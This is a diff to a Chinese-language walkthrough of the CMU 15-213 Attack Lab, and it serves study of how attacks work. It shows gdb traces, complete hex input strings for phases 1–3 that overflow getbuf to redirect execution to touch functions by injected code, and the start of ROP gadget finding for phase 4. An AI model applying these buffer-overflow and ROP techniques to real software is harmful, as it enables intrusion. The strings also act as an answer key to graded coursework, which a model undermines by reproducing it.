@@ -103,7 +103,35 @@ r -q
 │es             0x0      0                                  fs             0x0      0                                  gs             0x0      0                                    │
 │k0             0x0      0                                  k1             0x0      0                                  k2             0x0      0                                    │
 │k3             0x0      0                                  k4             0x0      0                                  k5             0x0      0                                    │
-│k6             0x0      0                                  k7             0x0      0                                                                           
+│k6             0x0      0                                  k7             0x0      0                                                                                               │
+│                                                                                                                                                                                   │
+│                                                                                                                                                                                   │
+   ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
+B+ │0x4017a8 <getbuf>       sub    $0x28,%rsp                                                                                                                                       │
+   │0x4017ac <getbuf+4>     mov    %rsp,%rdi                                                                                                                                        │
+   │0x4017af <getbuf+7>     callq  0x401a40 <Gets>                                                                                                                                  │
+   │0x4017b4 <getbuf+12>    mov    $0x1,%eax                                                                                                                                        │
+   │0x4017b9 <getbuf+17>    add    $0x28,%rsp                                                                                                                                       │
+  >│0x4017bd <getbuf+21>    retq                                                                                                                                                    │
+   │0x4017be                nop                                                                                                                                                     │
+   │0x4017bf                nop                                                                                                                                                     │
+   │0x4017c0 <touch1>       sub    $0x8,%rsp                                                                                                                                        │
+   │0x4017c4 <touch1+4>     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>                                                                                                   │
+   │0x4017ce <touch1+14>    mov    $0x4030c5,%edi                                                                                                                                   │
+   │0x4017d3 <touch1+19>    callq  0x400cc0 <puts@plt>                                                                                                                              │
+   │0x4017d8 <touch1+24>    mov    $0x1,%edi                                                                                                                                        │
+   └────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
+native process 1903 In: getbuf                                                                                                                                    L16   PC: 0x4017bd 
+
+(gdb) layout regs
+(gdb) r -q
+Starting program: /home/xiaojuer/experimet/target1/ctarget -q
+
+Breakpoint 1, getbuf () at buf.c:12
+(gdb) ni
+(gdb) ref
+(gdb) ni
+(gdb) 
 ```
 这时候rsp是0x5561dca0，再往下一步(也就是执行ret指令)，会发现把栈顶中(也就是0x5561dca0地址下)的8个字节读入了rip之中(也就是0x401971),具体寄存器如下图
 ```txt
@@ -300,3 +328,442 @@ B+ │0x4017a8 <getbuf>       sub    $0x28,%rsp                                 
    │0x4017d3 <touch1+19>    callq  0x400cc0 <puts@plt>                                                                                                                              │
    │0x4017d8 <touch1+24>    mov    $0x1,%edi                                                                                                                               
 ```
+
+## 验证答案
+用``cat phase1.txt | ./hex2raw | ./ctarget -q``指令验证答案
+```txt
+xiaojuer@ubuntu:~/experimet/target1$ cat phase1.txt | ./hex2raw | ./ctarget -q
+Cookie: 0x59b997fa
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
+```
+其中``result``后面跟着 ``PASS``字样那么就是成功了。``ctarget:1:``后面跟着的是输入的phase1.txt(答案)。可以对比一下是否是你输入的答案从而确认没搞错。
+顺便还得注意``Type string:Touch1!: You called touch1()``这一句，有这一句说明成功调用了``touch1()``函数，而不是其他函数。
+# phase2
+第二个阶段还是攻击ctarget
+
+首先要明白的是ctarget运行程序时候函数调用顺序是``main() -> ... -> test() -> getbuf()-> Gets()``
+然后顺序返回，我们的目标是在``test()``函数调用``getbuf()``函数并且``getbuf()``函数结束后不返回``test()``函数，而是返回``touch2()``函数。
+
+并且``touch2()``函数里面有一个判断，是判断传入的第一个参数是否是cookie值。
+
+每个人的cookie值放在了cookie.txt文件里面。打开后可以看见cookie值为:``0x59b997fa``
+
+那么根据分析可得，需要将cookie值传入到第一个参数中，也就是把cookie值放在rdi寄存器(默认存放第一个参数的寄存器)里面再调用``touch2()``函数即可。
+
+## 注入代码
+把cookie值放在rdi寄存器里的汇编代码可以是：
+**inc.s:**
+```txt
+mov $0x59b997fa , %rdi
+ret
+```
+
+(注:为什么要注入代码？牢记目标流程:getbuf()函数->把cookie值放在rdi寄存器->成功调用touch2()函数)
+
+新建一个inc.s文件然后把注入代码放入里面
+再在终端输入指令进行编译``gcc -c inc.s``和反汇编``objdump -d inc.o > inc.asm``
+```txt
+xiaojuer@ubuntu:~/experimet/target1$ gcc -c inc.s
+xiaojuer@ubuntu:~/experimet/target1$ objdump -d inc.o > inc.asm
+```
+就可以得到inc.asm文件
+inc.asm:
+```c
+
+inc.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+   7:	c3                   	retq   
+```
+里面包含了刚刚想要的汇编代码``mov    $0x59b997fa,%rdi retq``，以及他的机器码``48 c7 c7 fa 97 b9 59 c3``。
+那么就可以用机器码放在栈里面从而实现我们想要的汇编代码。
+
+其实和之前看ctarget.d文件里面的内容是一样的原理
+例如``getbuf()``函数
+```c
+00000000004017a8 <getbuf>:
+  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
+  4017ac:	48 89 e7             	mov    %rsp,%rdi
+  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
+  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
+  4017b9:	48 83 c4 28          	add    $0x28,%rsp
+  4017bd:	c3                   	retq   
+  4017be:	90                   	nop
+  4017bf:	90                   	nop
+```
+当rip寄存器是4017a8，那么下一步就会执行``48 83 ec 28``，刚好是一组合法的机器码，对应的汇编代码为``sub    $0x28,%rsp``。
+因为机器码不易读，所以在asm窗口内就仅仅显示了汇编代码，没有显示底层的机器码(结合计算机内都是一堆数字(二进制/二进制转16进制为一组)就可以理解)。
+
+根据phase1阶段解读的内容，阶段二实际上是阶段一的基础上加上了注入代码这一步。
+我们可以把注入代码的机器码放在(任意？)位置，然后获取到其地址，就可以实现返回到我们想要执行的代码了。
+
+例如下面的答案是把注入代码的机器码放在了第一行，因为前三个阶段的栈是同一个空间，所以查看就可以知道第一行对应的地址为``0x5561dc78``以此类推。
+```txt
+(gdb) x/80xb $rsp
+0x5561dc78:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dc98:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dca0:     0xc0    0x17    0x40    0x00    0x00    0x00    0x00    0x00
+0x5561dca8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dcb0:     0x24    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
+0x5561dcb8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dcc0:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+```
+那么第一次的返回地址就是``0x5561dc78``，然后注入代码结尾还有一个``ret``指令，会从栈顶再读取一个地址，这个时候已经将cookie值放在了rdi里面了，再读取的地址为``touch2()``函数的地址就可以PASS这一阶段了。
+
+**phase2:**
+```txt
+48 c7 c7 fa 97 b9 59 c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+总流程 : test()函数 -> call指令 -> 栈顶放入返回地址 -> 调用getbuf()函数 - > 开辟空间 -> call指令调用Gets()函数读入数据(此时覆盖了之前放入的返回地址)并且ret返回 -> 释放空间 -> ret指令在栈顶读入 ``0x5561dc78`` 到 rip寄存器里 -> 执行地址``0x5561dc78``里面的指令(机器码组)``48 c7 c7 fa 97 b9 59 (mov    $0x59b997fa,%rdi , 将cookie值放入rdi里面)`` ``c3 (ret , 返回, ret指令在栈顶读入 touch2()函数的地址4017ec 到 rip寄存器里)`` -> 成功调用``touch2()``函数
+
+理解了阶段一和阶段二这个流程后，就可以自己制作答案了。并且只要中间过程没有改变期望的内容，那么执行肯定是PASS的。
+## 制作答案
+答案还可以是:
+```txt
+c7 05 0e 2d 20 00 01 c3
+48 c7 c7 fa 97 b9 59 c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+5f c3 00 00 00 00 00 00
+98 dc 61 55 00 00 00 00
+fa 97 b9 59 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+
+```txt
+c7 05 0e 2d 20 00 01 c3
+48 c7 c7 fa 97 b9 59 c3
+00 00 00 00 00 00 00 00
+58 97 c3 00 00 00 00 00
+5f c3 00 00 00 00 00 00
+90 dc 61 55 00 00 00 00
+fa 97 b9 59 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+...更简单 or 更复杂都可
+
+只需要保证调用``touch2()``函数时候rdi里面存放的是cookie值即可。更多答案可以自己尝试。
+
+# phase3
+阶段三还是攻击**ctarget**
+## 参考流程
+阶段三和阶段二不同的点是调用函数为``touch3()``并且传入第一个参数为cookie字符串,因为C语言中传入字符串实际上是传入地址。
+所以流程为: [把cookie字符串转为ASCLL码](https://www.asciim.cn/m/tools/convert_string_to_ascii.html) -> 将字符串放在(在成功调用touch3()里面比较指令前都不会被修改的)内存中 -> 把字符串的内容地址放在rdi寄存器中 -> 成功调用``touch3()``函数
+
+**推荐把字符串放在调用``touch3()``函数地址后面，这样可以确保不会被修改。**
+
+如果说前两个阶段都是学习，第三个阶段就是检测成果。
+不会的话可以参考(例如)：
+```txt
+<第一个返回地址>：<pop %rdi , ret>
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+<第一个返回地址>
+<字符串地址>
+<touch3()函数地址>
+<字符串地址>:35 39 62 39 39 37 66 61
+```
+还可以：
+```txt
+<第一个返回地址>：<mov $<字符串地址>,%rdi , ret>
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+<第一个返回地址>
+<touch3()函数地址>
+<字符串地址>:35 39 62 39 39 37 66 61
+```
+
+看不太懂的话可以参考一下下面的阶段二然后试图解读：
+**phase2:**
+```txt
+48 c7 c7 fa 97 b9 59 c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+对应的是:
+```txt
+<第一个返回地址>：<mov $<cookie值>,%rdi , ret>
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+<第一个返回地址>
+<touch2()函数地址>
+```
+
+## 自制答案
+
+这是稍微修改阶段二某个答案形成的阶段三的答案，请自行试图解读，不会的话可以按照上面教程动态调试。
+```txt
+c7 05 0e 2d 20 00 01 c3
+48 c7 c7 fa 97 b9 59 c3
+00 00 00 00 00 00 00 00
+58 97 c3 00 00 00 00 00
+5f c3 00 00 00 00 00 00
+90 dc 61 55 00 00 00 00
+b8 dc 61 55 00 00 00 00
+fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61
+```
+
+# phase4
+在阶段四我们需要用ROP攻击方式去攻击**rtarget**
+前三个阶段都是攻击**ctarget**
+## 前置知识
+ROP的全称为Return-oriented programming（返回导向编程）
+可以稍微略读一下[基本ROP讲解](https://zhuanlan.zhihu.com/p/137144976)的前面部分。
+
+其主要思想是在 **栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**
+
+注意重点1：栈缓冲区溢出的基础上
+
+注意重点2：程序中已有的小片段
+
+第四和第五个阶段可用的片段为：从``start_farm()``函数开始到``end_farm()``结束中间所有的代码片段。具体如下farm.d文件(自己建立的,实际片段可以在rtarget.d文件(如果没有此文件请看前置工作内容)里面查找)
+farm.d:
+```c
+
+0000000000401994 <start_farm>:
+  401994:	b8 01 00 00 00       	mov    $0x1,%eax
+  401999:	c3                   	retq   
+
+000000000040199a <getval_142>:
+  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
+  40199f:	c3                   	retq   
+
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq   
+
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+
+00000000004019ae <setval_237>:
+  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
+  4019b4:	c3                   	retq   
+
+00000000004019b5 <setval_424>:
+  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
+  4019bb:	c3                   	retq   
+
+00000000004019bc <setval_470>:
+  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
+  4019c2:	c3                   	retq   
+
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq   
+
+00000000004019ca <getval_280>:
+  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  4019cf:	c3                   	retq   
+
+00000000004019d0 <mid_farm>:
+  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
+  4019d5:	c3                   	retq   
+
+00000000004019d6 <add_xy>:
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  4019da:	c3                   	retq   
+
+00000000004019db <getval_481>:
+  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
+  4019e0:	c3                   	retq   
+
+00000000004019e1 <setval_296>:
+  4019e1:	c7 07 99 d1 90 90    	movl   $0x9090d199,(%rdi)
+  4019e7:	c3                   	retq   
+
+00000000004019e8 <addval_113>:
+  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
+  4019ee:	c3                   	retq   
+
+00000000004019ef <addval_490>:
+  4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax
+  4019f5:	c3                   	retq   
+
+00000000004019f6 <getval_226>:
+  4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax
+  4019fb:	c3                   	retq   
+
+00000000004019fc <setval_384>:
+  4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)
+  401a02:	c3                   	retq   
+
+0000000000401a03 <addval_190>:
+  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
+  401a09:	c3                   	retq   
+
+0000000000401a0a <setval_276>:
+  401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)
+  401a10:	c3                   	retq   
+
+0000000000401a11 <addval_436>:
+  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
+  401a17:	c3                   	retq   
+
+0000000000401a18 <getval_345>:
+  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
+  401a1d:	c3                   	retq   
+
+0000000000401a1e <addval_479>:
+  401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax
+  401a24:	c3                   	retq   
+
+0000000000401a25 <addval_187>:
+  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
+  401a2b:	c3                   	retq   
+
+0000000000401a2c <setval_248>:
+  401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)
+  401a32:	c3                   	retq   
+
+0000000000401a33 <getval_159>:
+  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
+  401a38:	c3                   	retq   
+
+0000000000401a39 <addval_110>:
+  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
+  401a3f:	c3                   	retq   
+
+0000000000401a40 <addval_487>:
+  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
+  401a46:	c3                   	retq   
+
+0000000000401a47 <addval_201>:
+  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
+  401a4d:	c3                   	retq   
+
+0000000000401a4e <getval_272>:
+  401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax
+  401a53:	c3                   	retq   
+
+0000000000401a54 <getval_155>:
+  401a54:	b8 89 c2 c4 c9       	mov    $0xc9c4c289,%eax
+  401a59:	c3                   	retq   
+
+0000000000401a5a <setval_299>:
+  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
+  401a60:	c3                   	retq   
+
+0000000000401a61 <addval_404>:
+  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax
+  401a67:	c3                   	retq   
+
+0000000000401a68 <getval_311>:
+  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
+  401a6d:	c3                   	retq   
+
+0000000000401a6e <setval_167>:
+  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
+  401a74:	c3                   	retq   
+
+0000000000401a75 <setval_328>:
+  401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)
+  401a7b:	c3                   	retq   
+
+0000000000401a7c <setval_450>:
+  401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)
+  401a82:	c3                   	retq   
+
+0000000000401a83 <addval_358>:
+  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax
+  401a89:	c3                   	retq   
+
+0000000000401a8a <addval_124>:
+  401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax
+  401a90:	c3                   	retq   
+
+0000000000401a91 <getval_169>:
+  401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax
+  401a96:	c3                   	retq   
+
+0000000000401a97 <setval_181>:
+  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
+  401a9d:	c3                   	retq   
+
+0000000000401a9e <addval_184>:
+  401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax
+  401aa4:	c3                   	retq   
+
+0000000000401aa5 <getval_472>:
+  401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax
+  401aaa:	c3                   	retq   
+
+0000000000401aab <setval_350>:
+  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
+  401ab1:	c3                   	retq   
+
+0000000000401ab2 <end_farm>:
+  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax
+  401ab7:	c3                   	retq   
+  401ab8:	90                   	nop
+  401ab9:	90                   	nop
+  401aba:	90                   	nop
+  401abb:	90                   	nop
+  401abc:	90                   	nop
+  401abd:	90                   	nop
+  401abe:	90                   	nop
+  401abf:	90                   	nop
+
+```
+
+## 开始寻找可用片段
+查看下表可以快速查找：
+![](https://pic4.zhimg.com/v2-baa41fc5c5e23231ec4d5f3929d319ef_1440w.jpg)
+例如想要找 ``pop %rax``汇编代码，可以找到 ``58`` 这个机器码就是对应着  ``pop %rax``。
+当然如果用阶段二的办法，在.s文件里面写入想要的汇编代码然后编译和反汇编也是可以的。
+例如:
+```txt
+
+inc.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	58                   	pop    %rax
+   1:	97                   	xchg   %eax,%edi
+   2:	c3                   	retq   
+```
+也是可以知道``pop %rax``对应的是``58``
+然后我们在farm.d文件里面查询58可以找到片段之一为：
+```txt
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+```
+可以看到有 ``58 90 c3`` , 对应着是 ``pop %rax , nop , ret``，刚好符合我们的需求。
+那么就要找到它的地址，可以看到``4019a7:	8d 87 51 73 58 90  ``这个意思是``8d``这个机器码对应的地址是``4019a7``
+那么往后数，``4019a7 + 1 = 4019a8``对应着是``87`` ， ``4019a9``对应着是``51``， ``4019aa``对应着是``73``
+以此类推我们要的``58``就是``4019ab``
+
+所有在返回地址中输入``0x4019ab``那么就会跳到``addval_219()``函数片段里面运行``58 90 c3``
